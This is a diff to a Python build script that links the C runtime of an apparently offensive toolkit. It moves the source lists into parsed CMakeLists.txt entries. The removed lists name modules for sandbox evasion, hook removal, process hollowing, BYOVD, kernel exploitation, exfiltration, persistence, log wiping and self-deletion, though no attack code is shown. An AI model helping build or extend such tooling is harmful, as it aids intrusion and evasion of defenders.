@@ -61,7 +61,7 @@ class LinkStage(Stage):
             link_cmd = [
                 str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path)
             ] + runtime_objs + [
-                "-lcurl", "-lcrypto", "-lz", "-o", str(output)
+                "-lcurl", "-lcrypto", "-lz", "-lm", "-o", str(output)
             ]
             run_cmd(link_cmd, "Linking Linux ELF executable")
 
@@ -77,6 +77,60 @@ class LinkStage(Stage):
                 return Path(p)
         return None
 
+    def _parse_cmake_sources(self, runtime_dir: Path) -> list:
+        """Parse CMakeLists.txt and extract RUNTIME_SOURCES list."""
+        cmake_file = runtime_dir / "CMakeLists.txt"
+        if not cmake_file.exists():
+            return []
+
+        sources = []
+        content = cmake_file.read_text()
+        in_sources = False
+
+        for line in content.split('\n'):
+            line = line.strip()
+            if 'set(RUNTIME_SOURCES' in line:
+                in_sources = True
+                continue
+            if in_sources:
+                if line.startswith(')'):
+                    break
+                if line and not line.startswith('#'):
+                    source_path = line.rstrip()
+                    sources.append(source_path)
+
+        return sources
+
+    def _filter_sources_for_platform(self, sources: list, runtime_dir: Path, target_os: str) -> list:
+        """Filter CMakeLists sources for the target platform."""
+        # Files/folders that are Windows-only (from CMakeLists.txt REMOVE_ITEM for Linux)
+        windows_only_prefixes = {"windows", "byovd", "exfil", "pack"}
+
+        filtered = []
+        for src in sources:
+            src_path = runtime_dir / src
+            filename = src.split('/')[-1].lower()
+
+            # Check if filename contains platform indicators
+            if "linux" in filename and target_os == "windows":
+                continue
+            if "windows" in filename and target_os == "linux":
+                continue
+
+            # Platform filtering logic - check first path component
+            parts = src.split('/')
+            is_windows_only = parts[0] in windows_only_prefixes
+            is_linux_only = parts[0] == "linux"
+
+            if is_windows_only and target_os != "windows":
+                continue
+            if is_linux_only and target_os != "linux":
+                continue
+
+            filtered.append(src_path)
+
+        return [s for s in filtered if s.exists()]
+
     def _compile_runtime(self, tc, out_dir: Path, target_os: str) -> list:
         """Compile the JOCKY runtime C sources and return list of .o paths."""
         script_dir = Path(__file__).parent.parent.parent.parent
@@ -84,77 +138,9 @@ class LinkStage(Stage):
         if not runtime_dir.exists():
             return []
 
-        # Portable sources (always compiled)
-        portable_sources = [
-            runtime_dir / "init" / "anti_analysis.c",
-            runtime_dir / "compression"      / "compression.c",
-        ]
-
-        # Windows-only sources
-        windows_sources = []
-        if target_os == "windows":
-            potential_sources = [
-                runtime_dir / "util"                    / "mem.c",
-                runtime_dir / "windows"                 / "windows_utils.c",
-                runtime_dir / "windows"                 / "windows_api_impl.c",
-                runtime_dir / "windows"                 / "registry" / "registry.c",
-                runtime_dir / "windows"                 / "evasion" / "unhook.c",
-                runtime_dir / "windows"                 / "evasion" / "syscalls.c",
-                runtime_dir / "windows"                 / "evasion" / "stack_spoof.c",
-                runtime_dir / "windows"                 / "execution" / "hollow.c",
-                runtime_dir / "windows"                 / "execution" / "byovd.c",
-                runtime_dir / "windows"                 / "execution" / "inmem.c",
-                runtime_dir / "windows"                 / "execution" / "driver_interact.c",
-                runtime_dir / "windows"                 / "exploitation" / "kernel_exploit.c",
-                runtime_dir / "exfil"                   / "exfil.c",
-                runtime_dir / "windows"                 / "anti_forensics" / "forensics.c",
-                runtime_dir / "windows"                 / "anti_forensics" / "self_delete.c",
-                runtime_dir / "windows"                 / "anti_forensics" / "logs.c",
-                runtime_dir / "forensics"               / "forensic_api_impl.c",
-                runtime_dir / "core"                    / "sandbox.c",
-                runtime_dir / "core"                    / "plugin.c",
-                runtime_dir / "crypto"                  / "crypto.c",
-                runtime_dir / "network"                 / "network.c",
-                runtime_dir / "obfuscation.c",
-            ]
-            windows_sources = [s for s in potential_sources if s.exists()]
-
-        # Linux-specific sources
-        linux_sources = []
-        if target_os == "linux":
-            linux_potential = [
-                runtime_dir / "util"                    / "mem.c",
-                runtime_dir / "util"                    / "strings.c",
-                runtime_dir / "util"                    / "process.c",
-                runtime_dir / "compression"             / "compression.c",
-                runtime_dir / "common"                  / "encoding.c",
-                runtime_dir / "forensics"               / "forensic_api_impl.c",
-                runtime_dir / "linux"                   / "syscalls" / "syscall.c",
-                runtime_dir / "linux"                   / "syscalls" / "sysinfo_syscall.c",
-                runtime_dir / "linux"                   / "syscalls" / "env_syscall.c",
-                runtime_dir / "linux"                   / "syscalls" / "file_syscall.c",
-                runtime_dir / "linux"                   / "syscalls" / "dir_syscall.c",
-                runtime_dir / "linux"                   / "kernel" / "lkm_loader.c",
-                runtime_dir / "linux"                   / "kernel" / "ebpf_loader.c",
-                runtime_dir / "linux"                   / "kernel" / "modules.c",
-                runtime_dir / "linux"                   / "kernel" / "module_ops.c",
-                runtime_dir / "linux"                   / "kernel" / "module_loader.c",
-                runtime_dir / "linux"                   / "persistence.c",
-                runtime_dir / "linux"                   / "exfil" / "exfil_channels.c",
-                runtime_dir / "linux"                   / "io" / "io_core.c",
-                runtime_dir / "linux"                   / "threading" / "threadpool.c",
-                runtime_dir / "linux"                   / "networking" / "network.c",
-                runtime_dir / "linux"                   / "forensics" / "linux_forensics.c",
-                runtime_dir / "linux"                   / "forensics" / "cleanup.c",
-                runtime_dir / "linux"                   / "process" / "ptrace_control.c",
-                runtime_dir / "linux"                   / "process" / "thread_hijack.c",
-                runtime_dir / "evasion"                 / "unhook.c",
-                runtime_dir / "cleanup"                 / "self_delete.c",
-                runtime_dir / "cleanup"                 / "logs.c",
-            ]
-            linux_sources = [s for s in linux_potential if s.exists()]
-
-        all_sources = [s for s in portable_sources + windows_sources + linux_sources if s.exists()]
+        # Parse CMakeLists.txt for single source of truth
+        cmake_sources = self._parse_cmake_sources(runtime_dir)
+        all_sources = self._filter_sources_for_platform(cmake_sources, runtime_dir, target_os)
         if not all_sources:
             return []
 
